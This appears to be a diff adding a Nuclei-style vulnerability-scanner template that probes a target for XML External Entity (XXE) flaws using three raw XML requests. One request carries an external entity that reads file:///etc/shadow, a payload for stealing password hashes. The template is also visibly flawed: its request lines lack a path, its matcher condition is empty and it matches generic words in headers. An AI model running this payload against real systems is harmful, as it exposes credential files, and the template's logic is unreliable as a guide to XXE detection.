@@ -1,0 +1,56 @@
+id: xxe
+info:
+  name: XML External Entity (XXE)
+  severity: medium
+  author: lovelyboss
+requests:
+  - raw:
+      - |
+        GET HTTP/1.1
+        Host: {{BaseURL}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Referer: {{BaseURL}}
+
+        <!--?xml version="1.0" ? -->
+        <userInfo>
+          <firstName>John</firstName>
+          <lastName>Doe</lastName>
+        </userInfo>
+      
+      - |
+        GET HTTP/1.1
+        Host: {{BaseURL}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Referer: {{BaseURL}}
+
+        <!--?xml version="1.0" ?-->
+        <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+         <userInfo>
+          <firstName>John</firstName>
+          <lastName>&example;</lastName>
+         </userInfo>
+
+      - |
+        GET HTTP/1.1
+        Host: {{BaseURL}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Referer: {{BaseURL}}
+
+        <!--?xml version="1.0" ?-->
+        <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
+        <userInfo>
+         <firstName>John</firstName>
+         <lastName>&ent;</lastName>
+        </userInfo>
+
+    matchers-condition:
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "John"
+          - "Doe"
+          - "etc/pass"
+          - "xxe"
+          - "xml"
+          - '<?xml version="1.0"?>'
